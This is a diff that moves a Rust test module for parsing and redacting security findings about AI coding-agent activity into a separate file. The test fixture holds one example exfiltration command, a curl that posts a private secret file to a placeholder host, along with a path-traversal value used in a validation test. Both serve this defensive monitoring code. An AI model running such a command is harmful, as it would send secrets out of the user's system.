+++ desktop/src-tauri/src/commands/numbat_findings.rs
@@ -835,269 +835,4 @@ pub fn read_numbat_findings(
 mod lifecycle_tests;
 
 #[cfg(test)]
-mod tests {
-    use std::io::Write as _;
-
-    use super::*;
-
-    const TEST_AGENT: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
-
-    fn finding_json(overrides: serde_json::Value) -> String {
-        let mut value = serde_json::json!({
-            "schema_version": "0.2.0",
-            "record_type": "finding",
-            "finding_id": "fnd-safe-01",
-            "rule_id": "chain.secret_read_then_egress",
-            "title": "Secret access followed by network egress",
-            "severity": "high",
-            "detected_at": "2026-07-30T14:40:00Z",
-            "source_agent": "codex",
-            "session_id": "session-safe-01",
-            "cited_event_ids": ["event-sensitive-secret-read-id", "event-sensitive-egress-id"],
-            "observed_command": "curl --data-binary @/private/secret https://example.invalid",
-            "project_path_hash": "sha256:sensitive-project",
-            "endpoint": {
-                "hostname": "sensitive-host",
-                "username": "sensitive-user"
-            },
-            "evidence_refs": [{
-                "local_path": "/private/transcript.jsonl"
-            }]
-        });
-        if let (Some(base), Some(extra)) = (value.as_object_mut(), overrides.as_object()) {
-            base.extend(extra.clone());
-        }
-        serde_json::to_string(&value).expect("serialize fixture")
-    }
-
-    fn test_health() -> NumbatGuardianHealth {
-        NumbatGuardianHealth {
-            state: "configured".into(),
-            detail: "test".into(),
-        }
-    }
-
-    #[test]
-    fn projection_excludes_sensitive_source_fields() {
-        let projected = project_finding(
-            finding_json(serde_json::json!({})).as_bytes(),
-            TEST_AGENT,
-            "session-safe-01",
-            "channel-safe-01",
-            "turn-safe-01",
-        )
-        .expect("finding");
-        let serialized = serde_json::to_string(&projected).expect("serialize projection");
-
-        assert_eq!(projected.severity, "high");
-        assert_eq!(projected.evidence_count, 2);
-        assert_eq!(projected.source_agent, TEST_AGENT);
-        assert_eq!(projected.channel_id.as_deref(), Some("channel-safe-01"));
-        assert_eq!(projected.turn_id.as_deref(), Some("turn-safe-01"));
-        for forbidden in [
-            "observed_command",
-            "curl",
-            "sensitive-host",
-            "sensitive-user",
-            "sensitive-project",
-            "/private/",
-            "event-sensitive-secret-read-id",
-            "event-sensitive-egress-id",
-        ] {
-            assert!(
-                !serialized.contains(forbidden),
-                "projection leaked {forbidden}"
-            );
-        }
-    }
-
-    #[test]
-    fn invalid_schema_severity_and_control_text_are_rejected() {
-        assert!(project_finding(
-            finding_json(serde_json::json!({"schema_version": "9.9.9"})).as_bytes(),
-            TEST_AGENT,
-            "session-safe-01",
-            "channel-safe-01",
-            "turn-safe-01",
-        )
-        .is_none());
-        assert!(project_finding(
-            finding_json(serde_json::json!({"severity": "emergency"})).as_bytes(),
-            TEST_AGENT,
-            "session-safe-01",
-            "channel-safe-01",
-            "turn-safe-01",
-        )
-        .is_none());
-        let sensitive_title = project_finding(
-            finding_json(serde_json::json!({
-                "title": "Leaked /private/key with token super-secret"
-            }))
-            .as_bytes(),
-            TEST_AGENT,
-            "session-safe-01",
-            "channel-safe-01",
-            "turn-safe-01",
-        )
-        .expect("finding with untrusted source title");
-        assert_eq!(sensitive_title.title, "Possible secret exfiltration");
-    }
-
-    #[test]
-    fn validates_agent_pubkey_before_path_construction() {
-        assert!(validate_agent_pubkey(&"a".repeat(64)).is_ok());
-        assert!(validate_agent_pubkey("../../records").is_err());
-        assert!(validate_agent_pubkey(&"g".repeat(64)).is_err());
-    }
-
-    #[test]
-    fn runtime_label_is_not_treated_as_managed_agent_identity() {
-        let projected = project_finding(
-            finding_json(serde_json::json!({"source_agent": "claude-code"})).as_bytes(),
-            TEST_AGENT,
-            "session-safe-01",
-            "channel-safe-01",
-            "turn-safe-01",
-        )
-        .expect("finding from agent-scoped file");
-
-        assert_eq!(projected.source_agent, TEST_AGENT);
-    }
-
-    #[test]
-    fn reads_only_complete_records_and_advances_cursor() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        let path = dir.path().join("findings.ndjson");
-        let first = finding_json(serde_json::json!({"finding_id": "fnd-first"}));
-        let second = finding_json(serde_json::json!({"finding_id": "fnd-second"}));
-        {
-            let mut file = File::create(&path).expect("create");
-            writeln!(file, "{first}").expect("write first");
-            write!(file, "{second}").expect("write partial second");
-        }
-
-        let first_batch = read_numbat_findings_from_path(
-            &path,
-            0,
-            Some((
-                TEST_AGENT,
-                "session-safe-01",
-                "channel-safe-01",
-                "turn-safe-01",
-            )),
-            test_health(),
-        )
-        .expect("first batch");
-        assert_eq!(first_batch.findings.len(), 1);
-        assert_eq!(first_batch.findings[0].finding_id, "fnd-first");
-
-        {
-            let mut file = std::fs::OpenOptions::new()
-                .append(true)
-                .open(&path)
-                .expect("append");
-            writeln!(file).expect("complete second");
-        }
-        let second_batch = read_numbat_findings_from_path(
-            &path,
-            first_batch.next_offset,
-            Some((
-                TEST_AGENT,
-                "session-safe-01",
-                "channel-safe-01",
-                "turn-safe-01",
-            )),
-            test_health(),
-        )
-        .expect("second batch");
-        assert_eq!(second_batch.findings.len(), 1);
-        assert_eq!(second_batch.findings[0].finding_id, "fnd-second");
-    }
-
-    #[test]
-    fn truncation_resets_a_stale_cursor() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        let path = dir.path().join("findings.ndjson");
-        std::fs::write(&path, format!("{}\n", finding_json(serde_json::json!({})))).expect("write");
-
-        let batch = read_numbat_findings_from_path(
-            &path,
-            u64::MAX,
-            Some((
-                TEST_AGENT,
-                "session-safe-01",
-                "channel-safe-01",
-                "turn-safe-01",
-            )),
-            test_health(),
-        )
-        .expect("batch");
-        assert!(batch.reset);
-        assert_eq!(batch.findings.len(), 1);
-    }
-
-    #[test]
-    fn continuous_retention_keeps_complete_recent_records() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        let path = dir.path().join("findings.ndjson");
-        let padding = format!("{{\"padding\":\"{}\"}}\n", "x".repeat(1024));
-        let mut file = File::create(&path).expect("create");
-        while file.stream_position().expect("position") <= MAX_LOCAL_RECORD_BYTES {
-            file.write_all(padding.as_bytes()).expect("write padding");
-        }
-        let newest = finding_json(serde_json::json!({"finding_id": "fnd-newest"}));
-        writeln!(file, "{newest}").expect("write newest");
-        file.sync_all().expect("sync");
-        drop(file);
-
-        assert!(enforce_continuous_retention(&path).expect("retain"));
-        let retained = std::fs::read(&path).expect("read retained");
-        let previous = std::fs::read(previous_findings_path(&path)).expect("read prior");
-        assert!(retained.len() as u64 <= MAX_BACKLOG_BYTES + MAX_LINE_BYTES as u64);
-        assert!(retained.ends_with(format!("{newest}\n").as_bytes()));
-        assert!(previous.ends_with(format!("{newest}\n").as_bytes()));
-        assert!(!retained.starts_with(b"x"));
-        assert!(!enforce_continuous_retention(&path).expect("already bounded"));
-    }
-
-    #[test]
-    fn cursor_resets_when_retention_replaces_the_file_generation() {
-        let cursor = encode_cursor(41, 12_345).expect("cursor");
-        assert_eq!(decode_cursor(cursor, 41), (12_345, false));
-        assert_eq!(decode_cursor(cursor, 42), (0, true));
-        assert_eq!(decode_cursor(0, 42), (0, false));
-        assert!(encode_cursor(1, CURSOR_OFFSET_MASK + 1).is_err());
-        assert!(cursor <= (1_u64 << 53) - 1, "cursor must be exact in JS");
-    }
-
-    #[test]
-    fn projects_owner_observer_context_only_after_exact_session_match() {
-        let projected = project_finding(
-            finding_json(serde_json::json!({})).as_bytes(),
-            TEST_AGENT,
-            "session-safe-01",
-            "channel-safe-01",
-            "turn-safe-01",
-        )
-        .expect("matching context");
-        assert_eq!(projected.channel_id.as_deref(), Some("channel-safe-01"));
-        assert_eq!(projected.turn_id.as_deref(), Some("turn-safe-01"));
-
-        assert!(project_finding(
-            finding_json(serde_json::json!({})).as_bytes(),
-            TEST_AGENT,
-            "another-session",
-            "channel-safe-01",
-            "turn-safe-01",
-        )
-        .is_none());
-        assert!(project_finding(
-            finding_json(serde_json::json!({"source_agent": "bad source"})).as_bytes(),
-            TEST_AGENT,
-            "session-safe-01",
-            "channel-safe-01",
-            "turn-safe-01",
-        )
-        .is_none());
-    }
-}
+mod tests;
